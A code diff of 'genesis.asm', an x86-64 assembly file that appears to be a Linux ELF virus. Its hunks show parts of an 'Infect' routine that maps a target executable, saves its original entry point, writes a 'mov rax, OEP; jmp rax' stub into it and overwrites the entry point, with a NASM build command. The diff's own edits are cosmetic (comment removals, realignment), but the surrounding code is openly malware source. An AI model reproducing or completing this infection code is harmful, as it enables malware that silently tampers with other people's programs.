@@ -2,15 +2,9 @@
 ;@;                                                           genesis.asm ;@;
 ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
+; assemble
 ; nasm -f elf64 genesis.asm -o genesis.o
 ; ld genesis.o -o genesis
-
-; Note: Because I'm weird I decided to use camelCase for 
-;       constants and macros. Jokes aside, for this I wanted
-;       to experiment by approaching ASM like an high-level
-;       language, thus making it *hopefully* more readable
-;       for people that are less familiar with ASM.
-;
 
 %include "src/Macros.asm"
 %include "src/Structs.asm"
@@ -177,11 +171,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   test    rax,  rax                                 ; check if mmap(...) failed
   js      .InfectFailureExit
 
-  push    rax                                       ; rsp         -> FileMap (ELF-HDR)
-                                                    ; rsp + 0x8   -> FileSz
-                                                    ; rsp + 0x10  -> Old Entry
-                                                    ; rsp + 0x18  -> Program Hdr
-                                                    ; rsp + 0x20  -> EOF
+  push    rax
 
   ;; SAVE OLD ENTRY >-------------------------------------------------------<
   
@@ -281,7 +271,6 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
   mov   byte  [rbx + 10],   0xFF 
   mov   byte  [rbx + 11],   0xE0                        ; jmp rax
-  ; # maybe -> 48 c7 c0 <OEP>.. depending if we move a 64bit or a 32bit val
   
   ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
 
@@ -298,7 +287,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   sub   rsp,  0x8
   push  rdi
 
-  MSync rdx,  [rsp + VX_CTX.qFileSize - 0x10], MS_SYNC     ; msync(addr, len, MS_SYNC)
+  MSync rdx,  [rsp + VX_CTX.qFileSize - 0x10], MS_SYNC  ; msync(addr, len, MS_SYNC)
 
   pop   rdi
   add   rsp,  0x8
@@ -307,20 +296,20 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   js    .InfectCleanUp
 
   ; fsync(fd) - just to make sure
-  FSync rdi                                               ; fsync(fd)
+  FSync   rdi                                           ; fsync(fd)
 
-  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]                 ; free mapped file
+  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]               ; free mapped file
 
-  xor     rax,  rax                                       ; return 0
+  xor     rax,  rax                                     ; return 0
   mov     rsp,  rbp
   pop     rbp
   ret
 
   .InfectCleanUp:
-  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]                 ; free mapped file
+  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]               ; free mapped file
 
   .InfectFailureExit:
-  xor     rax,  rax                                       ; return 1
+  xor     rax,  rax                                     ; return 1
   inc     rax
   mov     rsp,  rbp
   pop     rbp
